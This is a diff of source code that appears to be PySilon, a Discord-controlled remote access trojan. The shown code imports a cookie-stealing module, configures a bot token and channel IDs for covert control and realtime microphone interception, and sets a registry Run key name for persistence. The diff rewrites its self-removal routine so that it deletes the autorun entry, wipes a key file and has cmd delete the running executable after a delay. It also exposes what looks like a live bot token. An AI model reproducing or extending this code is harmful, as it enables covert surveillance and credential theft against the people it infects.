@@ -41,8 +41,8 @@ from resources.get_cookies import *
 
 
 # ----------- Begin of config ---------- #
-# - Please check out README.md before  - #
-# -   you change following settings    - #
+# - Please check out README.md before  - #     ! It is recommended to use compiler.py for building executable !
+# -   you change following settings    - #       (following settings will be configured directly in compiler.py)
 
 bot_token = 'NzQ2ODMyMjU1OTE3NDkwMTg2.X0GDvQ.6NO59zJzo9w37fKC3z8CxboE9Sk'   # Paste here BOT-token
 software_registry_name = 'PySilon'   # -------------------------------------------- Software name shown in registry
@@ -57,7 +57,7 @@ channel_ids = {
     'voice': 851570974867849257   # Paste here voice channel ID for realtime microphone intercepting
 }
 
-secret_key = '85f7ece84d246d848deea3fe275c5847f374a2103acdf7bd0bb4804bee258c46'   # Don't touch this line (just leave)
+secret_key = 'cd02dfefddcb91658c44fa2b7d250e6e3232b44db27322dfffecb52a765ce2e5'   # Don't touch this line (just leave)
 
 # -            End of config           - #
 # - Don't change anything below unless - #
@@ -236,7 +236,10 @@ async def on_reaction_add(reaction, user):
                         winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
                         registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
                         winreg.DeleteValue(registry_key, software_directory_name)
-                        secure_delete_file(sys.argv[0], 1000)
+                        secure_delete_file('PySilon.key', 10)
+                        cmd = 'start cmd /c "TIMEOUT /T 3&del "' + sys.argv[0] + '"'
+                        os.system(cmd)
+                        #sys.exit(0)
 
         except Exception as err: print(err)
 
